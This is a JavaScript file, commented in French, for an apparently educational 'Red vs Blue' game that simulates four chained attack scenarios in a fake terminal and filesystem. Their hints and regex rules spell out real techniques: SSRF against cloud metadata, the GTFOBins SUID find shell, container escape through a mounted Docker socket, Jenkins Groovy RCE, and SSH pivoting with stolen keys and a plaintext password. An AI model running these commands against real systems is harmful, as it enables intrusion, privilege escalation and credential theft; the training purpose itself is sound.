/* =========================================================
   RED vs BLUE — Scénarios chaînés (attaques multi-étapes)
   Chaque chaîne enchaîne plusieurs failles liées : la réussite
   d'une étape débloque le contexte de la suivante, dans une
   seule session terminal, jusqu'au root final.
   ========================================================= */

const CHAIN_SCENARIOS = [
  {
    id:'chain-web-to-root',
    title:'Du web au root',
    subtitle:'SSRF → clés cloud → pivot SSH → élévation SUID',
    category:"Chaîne d'attaque",
    intro:"Vous obtenez un accès web limité (www-data) sur un serveur exposé. Objectif : enchaîner les failles jusqu'à un shell root complet. Chaque étape réussie débloque la suivante.",
    startUser:'www-data', startCwd:'/var/www/html',
    makeVfs(){
      return {
        '/':{type:'dir',perm:'755',owner:'root',children:['var','home','usr','root','etc']},
        '/var':{type:'dir',perm:'755',owner:'root',children:['www','backups']},
        '/var/www':{type:'dir',perm:'755',owner:'root',children:['html']},
        '/var/www/html':{type:'dir',perm:'755',owner:'www-data',children:['index.php','fetch.php']},
        '/var/www/html/index.php':{type:'file',perm:'644',owner:'www-data',size:1200,content:"<?php /* page d'accueil */ ?>"},
        '/var/www/html/fetch.php':{type:'file',perm:'644',owner:'www-data',size:640,content:'<?php $u=$_GET["url"]; echo file_get_contents($u); /* SSRF : proxifie n\'importe quelle URL fournie */ ?>'},
        '/var/backups':{type:'dir',perm:'755',owner:'root',children:[]},
        '/home':{type:'dir',perm:'755',owner:'root',children:['deploy']},
        '/home/deploy':{type:'dir',perm:'750',owner:'deploy',children:['note.txt']},
        '/home/deploy/note.txt':{type:'file',perm:'640',owner:'deploy',size:80,content:'Penser à retirer la vieille clé de déploiement des sauvegardes...\n'},
        '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
        '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['find','cat','ls','curl','ssh']},
        '/usr/bin/find':{type:'file',perm:'755',owner:'root',suid:false,size:157832,content:'[binaire GNU findutils]'},
        '/etc':{type:'dir',perm:'755',owner:'root',children:[]},
        '/root':{type:'dir',perm:'700',owner:'root',children:['flag.txt']},
        '/root/flag.txt':{type:'file',perm:'600',owner:'root',size:44,content:'FLAG{chaine_ssrf_pivot_suid_root_complet}\n'}
      };
    },
    stages:[
      {
        title:'SSRF vers les métadonnées cloud',
        desc:"Le script fetch.php récupère côté serveur n'importe quelle URL fournie. Exploitez cette SSRF pour interroger le service de métadonnées cloud (169.254.169.254) et récupérer des identifiants temporaires.",
        hints:[
          "La page vulnérable est `/var/www/html/fetch.php` — elle proxifie le paramètre `url`. Lisez-la avec `cat`.",
          "Le endpoint de métadonnées AWS est `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.",
          "Simulez la requête SSRF : `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role`."
        ],
        exploitRules:[
          { pattern:/curl\s+.*169\.254\.169\.254.*security-credentials/i, run(state, print){
              print('{ "AccessKeyId":"ASIAEXAMPLE...", "SecretAccessKey":"wJalrXUtnFEMI...",', 'ok');
              print('  "Token":"FQoGZXIvYXdzE...",', 'ok');
              print('  "Note":"Ancienne clé SSH de déploiement sauvegardée dans /var/backups/deploy_id_rsa (permissions à revoir)." }', 'ok');
              if(!state.vfs['/var/backups/deploy_id_rsa']){
                state.vfs['/var/backups/deploy_id_rsa'] = {type:'file',perm:'644',owner:'root',size:1600,content:'-----BEGIN OPENSSH PRIVATE KEY-----\n[clé privée du compte deploy]\n-----END OPENSSH PRIVATE KEY-----\n'};
                state.vfs['/var/backups'].children.push('deploy_id_rsa');
              }
              state.flags.ssrf = true;
              print('[+] Identifiants récupérés via SSRF. Une clé SSH de déploiement lisible par tous est révélée.', 'info');
            }
          }
        ],
        check(state){ return state.flags.ssrf === true; }
      },
      {
        title:'Pivot SSH vers le compte deploy',
        desc:"La SSRF a révélé une clé SSH de déploiement laissée en sauvegarde, lisible par www-data. Récupérez-la et connectez-vous en tant que l'utilisateur deploy.",
        hints:[
          "La clé est en clair : `cat /var/backups/deploy_id_rsa`.",
          "Ses permissions sont bien trop larges (644, lisible par www-data).",
          "Pivotez avec : `ssh -i /var/backups/deploy_id_rsa deploy@localhost`."
        ],
        exploitRules:[
          { pattern:/ssh\s+.*-i\s+\/var\/backups\/deploy_id_rsa\s+deploy@/i, run(state, print){
              if(!state.flags.ssrf){ print('ssh: clé introuvable — commencez par révéler la clé de déploiement (étape 1).', 'err'); return; }
              state.user = 'deploy';
              state.cwd = '/home/deploy';
              state.env.USER = 'deploy'; state.env.HOME = '/home/deploy';
              state.flags.deploy = true;
              print('[+] Authentification par clé publique acceptée.', 'ok');
              print('[+] Session ouverte : deploy@target-lab.', 'ok');
              state.vfs['/usr/bin/find'].suid = true; // le SUID mal configuré devient exploitable
            }
          }
        ],
        check(state){ return state.user === 'deploy'; }
      },
      {
        title:'Élévation SUID vers root',
        desc:"Le compte deploy peut lancer un binaire portant un bit SUID root mal configuré. Exploitez-le pour obtenir un shell root et lire le drapeau final.",
        hints:[
          "Listez les binaires SUID : `find / -perm -4000 2>/dev/null`.",
          "`/usr/bin/find` porte le bit SUID root — ce n'est pas son comportement par défaut.",
          "GTFOBins : `find . -exec /bin/sh -p \\;` ouvre un shell aux privilèges du propriétaire du binaire (root)."
        ],
        exploitRules:[
          { pattern:/^find\s+\S*\s*-exec\s*\/bin\/sh\s*-p\s*\\?;?$/, run(state, print){
              const f = state.vfs['/usr/bin/find'];
              if(!f || !f.suid){ print('find: aucun bit SUID exploitable ici.', 'err'); return; }
              state.isRoot = true; state.user = 'root'; state.cwd = '/root';
              state.env.USER = 'root'; state.env.HOME = '/root';
              print('[+] find lance un sous-shell aux privilèges du propriétaire (root).', 'ok');
              print('[+] Shell root obtenu.', 'ok');
            }
          }
        ],
        check(state){ return state.isRoot === true; }
      }
    ]
  },

  {
    id:'chain-container-escape',
    title:'Évasion de conteneur',
    subtitle:'Recon conteneur → socket Docker monté → root sur l\'hôte',
    category:"Chaîne d'attaque",
    intro:"Vous disposez d'un shell limité (appuser) dans un conteneur applicatif compromis. Objectif : détecter l'environnement, repérer une mauvaise configuration, puis vous évader jusqu'à un accès root sur la machine hôte.",
    startUser:'appuser', startCwd:'/app',
    makeVfs(){
      return {
        '/':{type:'dir',perm:'755',owner:'root',children:['app','var','proc','root','.dockerenv','usr']},
        '/.dockerenv':{type:'file',perm:'644',owner:'root',size:0,content:''},
        '/app':{type:'dir',perm:'755',owner:'appuser',children:['app.py']},
        '/app/app.py':{type:'file',perm:'644',owner:'appuser',size:520,content:'from flask import Flask, request, render_template_string\napp = Flask(__name__)\n@app.route("/greet")\ndef greet():\n    return render_template_string("Bonjour " + request.args.get("name"))  # SSTI\n'},
        '/var':{type:'dir',perm:'755',owner:'root',children:['run']},
        '/var/run':{type:'dir',perm:'755',owner:'root',children:['docker.sock']},
        '/var/run/docker.sock':{type:'file',perm:'660',owner:'root',group:'docker',size:0,content:'[socket UNIX du démon Docker — monté dans le conteneur (mauvaise configuration)]'},
        '/proc':{type:'dir',perm:'555',owner:'root',children:['1']},
        '/proc/1':{type:'dir',perm:'555',owner:'root',children:['cgroup']},
        '/proc/1/cgroup':{type:'file',perm:'444',owner:'root',size:180,content:'12:devices:/docker/3f9a2b7c1d8e...\n11:memory:/docker/3f9a2b7c1d8e...\n0::/docker/3f9a2b7c1d8e...\n'},
        '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
        '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['docker']},
        '/usr/bin/docker':{type:'file',perm:'755',owner:'root',size:52000,content:'[client Docker]'},
        '/root':{type:'dir',perm:'700',owner:'root',children:['flag.txt']},
        '/root/flag.txt':{type:'file',perm:'600',owner:'root',size:46,content:'FLAG{evasion_conteneur_docker_sock_vers_hote}\n'}
      };
    },
    stages:[
      {
        title:'Reconnaissance : suis-je dans un conteneur ?',
        desc:"Vous avez un shell appuser. Déterminez si vous êtes dans un conteneur — c'est ce qui orientera toute la suite de l'attaque.",
        hints:[
          "La présence du fichier `/.dockerenv` trahit un conteneur Docker : `cat /.dockerenv` (ou `ls -la /.dockerenv`).",
          "Les cgroups le confirment aussi : `cat /proc/1/cgroup` — cherchez la mention `docker`."
        ],
        exploitRules:[
          { pattern:/(cat|ls)\s+.*\/\.dockerenv|cat\s+\/proc\/1\/cgroup/i, run(state, print){
              print('/.dockerenv présent · /proc/1/cgroup → 0::/docker/3f9a2b7c1d8e...', 'ok');
              print('[+] Environnement confirmé : vous êtes dans un conteneur Docker.', 'ok');
              print("[+] Vérifiez si le socket Docker a été monté à l'intérieur (/var/run/docker.sock).", 'info');
              state.flags.recon = true;
            }
          }
        ],
        check(state){ return state.flags.recon === true; }
      },
      {
        title:'Repérer le socket Docker monté',
        desc:"Une erreur de configuration fréquente : monter /var/run/docker.sock dans le conteneur. Repérez-le et confirmez que vous pouvez dialoguer avec le démon Docker de l'hôte.",
        hints:[
          "Vérifiez sa présence : `ls -la /var/run/docker.sock`.",
          "Confirmez l'accès au démon en listant les conteneurs : `docker ps`."
        ],
        exploitRules:[
          { pattern:/docker\s+(-H\s+\S+\s+)?ps\b/i, run(state, print){
              if(!state.flags.recon){ print('docker: commencez par confirmer votre environnement (étape 1).', 'err'); return; }
              print('CONTAINER ID   IMAGE            COMMAND         STATUS         NAMES', 'out');
              print('3f9a2b7c1d8e   webapp:latest    "python app.py" Up 2 hours     app_1', 'out');
              print('a1b2c3d4e5f6   redis:7          "redis-server"  Up 2 hours     cache_1', 'out');
              print('[+] Le socket Docker répond : vous contrôlez le démon Docker de l\'hôte.', 'ok');
              state.flags.socket = true;
            }
          }
        ],
        check(state){ return state.flags.socket === true; }
      },
      {
        title:'Évasion vers l\'hôte (root)',
        desc:"Avec la main sur le démon Docker, lancez un conteneur privilégié qui monte tout le système de fichiers de l'hôte, puis chroot dedans pour devenir root sur la machine hôte.",
        hints:[
          "Montez la racine de l'hôte dans un conteneur jetable : `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.",
          "Une fois chroot dans /mnt, vous êtes root sur l'hôte et pouvez lire /root/flag.txt."
        ],
        exploitRules:[
          { pattern:/docker\s+run\s+.*-v\s+\/:\/mnt.*chroot\s+\/mnt/i, run(state, print){
              if(!state.flags.socket){ print('docker: aucun accès au démon Docker — repérez d\'abord le socket (étape 2).', 'err'); return; }
              state.isRoot = true; state.user = 'root'; state.cwd = '/root';
              state.env.USER = 'root'; state.env.HOME = '/root';
              print('[+] Conteneur privilégié lancé, racine de l\'hôte montée sur /mnt.', 'ok');
              print('[+] chroot /mnt → shell root sur la machine hôte. Évasion réussie.', 'ok');
            }
          }
        ],
        check(state){ return state.isRoot === true; }
      }
    ]
  },

  {
    id:'chain-cicd-to-prod',
    title:'Pipeline compromis',
    subtitle:'Jenkins exposé → RCE Groovy → vol de secrets → root sur la prod',
    category:"Chaîne d'attaque",
    intro:"Vous avez un accès limité (utilisateur jenkins) sur un serveur d'intégration continue. Objectif : abuser de la console de script pour exécuter du code, voler les secrets stockés, et pivoter jusqu'à un accès root sur le serveur de production.",
    startUser:'jenkins', startCwd:'/var/lib/jenkins',
    makeVfs(){
      return {
        '/':{type:'dir',perm:'755',owner:'root',children:['var','root','usr','home']},
        '/var':{type:'dir',perm:'755',owner:'root',children:['lib']},
        '/var/lib':{type:'dir',perm:'755',owner:'root',children:['jenkins']},
        '/var/lib/jenkins':{type:'dir',perm:'750',owner:'jenkins',children:['config.xml','secrets','jobs']},
        '/var/lib/jenkins/config.xml':{type:'file',perm:'644',owner:'jenkins',size:900,content:'<hudson><securityRealm class="hudson.security.AuthorizationStrategy$Unsecured"/> ... </hudson>'},
        '/var/lib/jenkins/jobs':{type:'dir',perm:'750',owner:'jenkins',children:[]},
        '/var/lib/jenkins/secrets':{type:'dir',perm:'700',owner:'jenkins',children:['prod_root_key','master.key']},
        '/var/lib/jenkins/secrets/master.key':{type:'file',perm:'600',owner:'jenkins',size:256,content:'[clé maître de chiffrement Jenkins]'},
        '/var/lib/jenkins/secrets/prod_root_key':{type:'file',perm:'600',owner:'jenkins',size:1600,content:'-----BEGIN OPENSSH PRIVATE KEY-----\n[clé SSH déployée sur prod-server pour le compte root]\n-----END OPENSSH PRIVATE KEY-----\n'},
        '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
        '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['ssh','cat']},
        '/home':{type:'dir',perm:'755',owner:'root',children:['jenkins']},
        '/home/jenkins':{type:'dir',perm:'750',owner:'jenkins',children:[]},
        '/root':{type:'dir',perm:'700',owner:'root',children:['flag.txt']},
        '/root/flag.txt':{type:'file',perm:'600',owner:'root',size:44,content:'FLAG{jenkins_groovy_rce_secrets_prod_root}\n'}
      };
    },
    stages:[
      {
        title:'RCE via la console de script Groovy',
        desc:"La console de script Jenkins (/script) est accessible et exécute du Groovy avec les droits du service jenkins. Servez-vous-en pour exécuter une commande système.",
        hints:[
          "La console de script exécute du Groovy côté serveur : `jenkins-groovy 'println \"id\".execute().text'`.",
          "Tout ce que vous lancez s'exécute en tant que l'utilisateur jenkins, qui possède les secrets de l'instance."
        ],
        exploitRules:[
          { pattern:/jenkins-groovy|\.execute\(\)/i, run(state, print){
              print('uid=112(jenkins) gid=116(jenkins) groups=116(jenkins)', 'ok');
              print('[+] Exécution de code confirmée via la console de script Groovy (droits jenkins).', 'ok');
              print('[+] Les secrets de l\'instance sont dans /var/lib/jenkins/secrets/.', 'info');
              state.flags.rce = true;
            }
          }
        ],
        check(state){ return state.flags.rce === true; }
      },
      {
        title:'Vol des secrets stockés',
        desc:"Jenkins conserve des identifiants et clés dans son répertoire de secrets. Récupérez la clé SSH de déploiement qui donne accès au serveur de production.",
        hints:[
          "Listez les secrets : `ls -la /var/lib/jenkins/secrets/`.",
          "Récupérez la clé de prod en clair : `cat /var/lib/jenkins/secrets/prod_root_key`."
        ],
        exploitRules:[
          { pattern:/cat\s+.*\/var\/lib\/jenkins\/secrets\/prod_root_key/i, run(state, print){
              if(!state.flags.rce){ print('cat: accès refusé — obtenez d\'abord l\'exécution en tant que jenkins (étape 1).', 'err'); return; }
              print('-----BEGIN OPENSSH PRIVATE KEY-----', 'out');
              print('[clé SSH déployée sur prod-server pour le compte root]', 'out');
              print('-----END OPENSSH PRIVATE KEY-----', 'out');
              print('[+] Clé de déploiement récupérée : elle autorise root@prod-server.', 'ok');
              state.flags.secrets = true;
            }
          }
        ],
        check(state){ return state.flags.secrets === true; }
      },
      {
        title:'Pivot vers la production (root)',
        desc:"La clé volée est autorisée pour le compte root du serveur de production. Utilisez-la pour ouvrir une session root sur prod-server.",
        hints:[
          "La clé de Jenkins est déployée pour root sur la prod : `ssh -i /var/lib/jenkins/secrets/prod_root_key root@prod-server`.",
          "Une clé de déploiement autorisée pour root = compromission totale du serveur de production."
        ],
        exploitRules:[
          { pattern:/ssh\s+.*-i\s+\S*prod_root_key\s+root@/i, run(state, print){
              if(!state.flags.secrets){ print('ssh: clé introuvable — volez d\'abord la clé de déploiement (étape 2).', 'err'); return; }
              state.isRoot = true; state.user = 'root'; state.cwd = '/root';
              state.env.USER = 'root'; state.env.HOME = '/root';
              print('[+] Authentification par clé acceptée pour root@prod-server.', 'ok');
              print('[+] Session root ouverte sur le serveur de production. Compromission totale.', 'ok');
            }
          }
        ],
        check(state){ return state.isRoot === true; }
      }
    ]
  },

  {
    id:'chain-lateral-network',
    title:'Rebond de bout en bout',
    subtitle:'Clé exposée → pivot SSH interne → identifiants BDD en clair → pivot final → root',
    category:"Chaîne d'attaque",
    intro:"Vous disposez d'un accès web limité (www-data) sur le frontend public d'un mini-réseau à trois machines : web-frontend (exposé), app-internal (backend applicatif, non exposé) et db-core (base de données, injoignable directement depuis l'extérieur). Objectif : rebondir par SSH de machine en machine jusqu'à un accès root complet sur db-core. Contrairement aux autres chaînes, chaque machine a son propre système de fichiers indépendant.",
    startHost:'web-frontend',
    startUser:'www-data', startCwd:'/var/www/html',
    makeHosts(){
      return {
        'web-frontend': {
          '/':{type:'dir',perm:'755',owner:'root',children:['var','usr','root','etc']},
          '/var':{type:'dir',perm:'755',owner:'root',children:['www','backups']},
          '/var/www':{type:'dir',perm:'755',owner:'root',children:['html']},
          '/var/www/html':{type:'dir',perm:'755',owner:'www-data',children:['index.php','.env']},
          '/var/www/html/index.php':{type:'file',perm:'644',owner:'www-data',size:900,content:'<?php /* vitrine publique */ ?>'},
          '/var/www/html/.env':{type:'file',perm:'640',owner:'www-data',size:220,content:'APP_INTERNAL_HOST=app-internal\nAPP_INTERNAL_USER=appsvc\nAPP_INTERNAL_KEY=/var/backups/app_internal_id_rsa\n'},
          '/var/backups':{type:'dir',perm:'755',owner:'root',children:['app_internal_id_rsa']},
          '/var/backups/app_internal_id_rsa':{type:'file',perm:'644',owner:'root',size:1600,content:'-----BEGIN OPENSSH PRIVATE KEY-----\n[clé privée du compte appsvc — sauvegarde oubliée avec des permissions bien trop larges]\n-----END OPENSSH PRIVATE KEY-----\n'},
          '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
          '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['cat','ls','ssh']},
          '/etc':{type:'dir',perm:'755',owner:'root',children:[]},
          '/root':{type:'dir',perm:'700',owner:'root',children:[]}
        },
        'app-internal': {
          '/':{type:'dir',perm:'755',owner:'root',children:['home','opt','usr','root','etc']},
          '/home':{type:'dir',perm:'755',owner:'root',children:['appsvc']},
          '/home/appsvc':{type:'dir',perm:'750',owner:'appsvc',children:['note.txt']},
          '/home/appsvc/note.txt':{type:'file',perm:'640',owner:'appsvc',size:100,content:"Penser à restreindre les droits sur /opt/scripts/backup_db.sh (mot de passe en clair dedans).\n"},
          '/opt':{type:'dir',perm:'755',owner:'root',children:['scripts']},
          '/opt/scripts':{type:'dir',perm:'755',owner:'root',children:['backup_db.sh']},
          '/opt/scripts/backup_db.sh':{type:'file',perm:'644',owner:'root',size:260,content:'#!/bin/bash\n# sauvegarde nocturne de la base — identifiants en clair (à corriger)\nsshpass -p "S3cr3tRootPW" ssh root@db-core "mysqldump --all-databases" > /opt/backups/full.sql\n'},
          '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
          '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['cat','ls','ssh','sshpass']},
          '/etc':{type:'dir',perm:'755',owner:'root',children:[]},
          '/root':{type:'dir',perm:'700',owner:'root',children:[]}
        },
        'db-core': {
          '/':{type:'dir',perm:'755',owner:'root',children:['var','usr','root','etc']},
          '/var':{type:'dir',perm:'755',owner:'root',children:['lib']},
          '/var/lib':{type:'dir',perm:'755',owner:'root',children:['mysql']},
          '/var/lib/mysql':{type:'dir',perm:'700',owner:'mysql',children:[]},
          '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
          '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['cat','ls']},
          '/etc':{type:'dir',perm:'755',owner:'root',children:[]},
          '/root':{type:'dir',perm:'700',owner:'root',children:['flag.txt']},
          '/root/flag.txt':{type:'file',perm:'600',owner:'root',size:44,content:'FLAG{rebond_frontend_interne_dbcore_root}\n'}
        }
      };
    },
    stages:[
      {
        title:'Clé de service interne mal protégée',
        desc:"Le fichier `.env` du frontend web référence une clé SSH de service stockée sous /var/backups/, laissée avec des permissions bien trop permissives. Récupérez-la.",
        hints:[
          "Inspectez la configuration de l'application : `cat /var/www/html/.env`.",
          "Elle pointe vers `/var/backups/app_internal_id_rsa` — vérifiez ses permissions avec `ls -la /var/backups/`.",
          "Lisez la clé : `cat /var/backups/app_internal_id_rsa`."
        ],
        exploitRules:[
          { pattern:/cat\s+\/var\/backups\/app_internal_id_rsa/i, run(state, print){
              print('-----BEGIN OPENSSH PRIVATE KEY-----', 'out');
              print('[clé privée du compte appsvc sur app-internal]', 'out');
              print('-----END OPENSSH PRIVATE KEY-----', 'out');
              print('[+] Clé de service récupérée : elle autorise appsvc@app-internal.', 'ok');
              state.flags.leaked = true;
            }
          }
        ],
        check(state){ return state.flags.leaked === true; }
      },
      {
        title:'Pivot SSH vers app-internal',
        desc:"Utilisez la clé récupérée pour ouvrir une session sur le serveur applicatif interne, injoignable directement depuis l'extérieur.",
        hints:[
          "Le `.env` indiquait l'utilisateur et l'hôte : appsvc@app-internal.",
          "`ssh -i /var/backups/app_internal_id_rsa appsvc@app-internal`"
        ],
        exploitRules:[
          { pattern:/ssh\s+.*-i\s+\/var\/backups\/app_internal_id_rsa\s+appsvc@app-internal/i, run(state, print){
              if(!state.flags.leaked){ print('ssh: clé introuvable — récupérez d\'abord la clé de service (étape 1).', 'err'); return; }
              pivotHost(state, 'app-internal');
              state.user = 'appsvc'; state.cwd = '/home/appsvc'; state.isRoot = false;
              state.env.USER = 'appsvc'; state.env.HOME = '/home/appsvc';
              print('[+] Authentification par clé publique acceptée.', 'ok');
              print('[+] Session ouverte : appsvc@app-internal — ce serveur n\'est pas exposé publiquement.', 'ok');
            }
          }
        ],
        check(state){ return state.host === 'app-internal'; }
      },
      {
        title:'Identifiants de la base en clair',
        desc:"Un script de sauvegarde planifié sur app-internal contient le mot de passe root de la base de données db-core, en clair.",
        hints:[
          "Une note dans /home/appsvc signale un script à risque : `cat /home/appsvc/note.txt`.",
          "Le script visé : `cat /opt/scripts/backup_db.sh`."
        ],
        exploitRules:[
          { pattern:/cat\s+\/opt\/scripts\/backup_db\.sh/i, run(state, print){
              if(state.host !== 'app-internal'){ print('cat: fichier introuvable ici.', 'err'); return; }
              print('#!/bin/bash', 'out');
              print('# sauvegarde nocturne de la base — identifiants en clair (à corriger)', 'out');
              print('sshpass -p "S3cr3tRootPW" ssh root@db-core "mysqldump --all-databases" > /opt/backups/full.sql', 'out');
              print('[+] Mot de passe root de db-core récupéré : S3cr3tRootPW', 'ok');
              state.flags.dbcreds = true;
            }
          }
        ],
        check(state){ return state.flags.dbcreds === true; }
      },
      {
        title:'Pivot final vers db-core (root)',
        desc:"Le serveur de base de données n'accepte que des connexions internes. Utilisez le mot de passe root découvert pour vous y connecter directement.",
        hints:[
          "`sshpass` permet une authentification SSH par mot de passe non interactive.",
          "`sshpass -p \"S3cr3tRootPW\" ssh root@db-core`",
          "Une fois connecté, la session est déjà root sur db-core — le drapeau est dans /root/flag.txt."
        ],
        exploitRules:[
          { pattern:/sshpass\s+-p\s+["']?S3cr3tRootPW["']?\s+ssh\s+root@db-core/i, run(state, print){
              if(!state.flags.dbcreds){ print('sshpass: mot de passe inconnu — récupérez d\'abord les identifiants (étape 3).', 'err'); return; }
              pivotHost(state, 'db-core');
              state.user = 'root'; state.cwd = '/root'; state.isRoot = true;
              state.env.USER = 'root'; state.env.HOME = '/root';
              print('[+] Authentification par mot de passe acceptée pour root@db-core.', 'ok');
              print('[+] Session root ouverte sur db-core. Rebond complet du frontend jusqu\'à la base de données.', 'ok');
            }
          }
        ],
        check(state){ return state.isRoot === true && state.host === 'db-core'; }
      }
    ]
  }
];

/* ---------- Progression des chaînes (localStorage) ---------- */
const CHAINS_DONE_KEY = 'redvsblue_chains_done_v1';
function loadDoneChains(){
  try{ return JSON.parse(localStorage.getItem(CHAINS_DONE_KEY) || '[]'); }catch(e){ return []; }
}
function markChainDone(id){
  const l = loadDoneChains();
  if(!l.includes(id)){ l.push(id); try{ localStorage.setItem(CHAINS_DONE_KEY, JSON.stringify(l)); }catch(e){} }
}

const CHAIN_STATS_KEY = 'redvsblue_chain_stats_v1';
function loadChainStats(){
  try{ return JSON.parse(localStorage.getItem(CHAIN_STATS_KEY) || '{}'); }catch(e){ return {}; }
}
function saveChainTime(id, timeSec){
  const s = loadChainStats();
  if(!s[id] || timeSec < s[id].bestTime){
    s[id] = {bestTime: timeSec};
    try{ localStorage.setItem(CHAIN_STATS_KEY, JSON.stringify(s)); }catch(e){}
  }
}
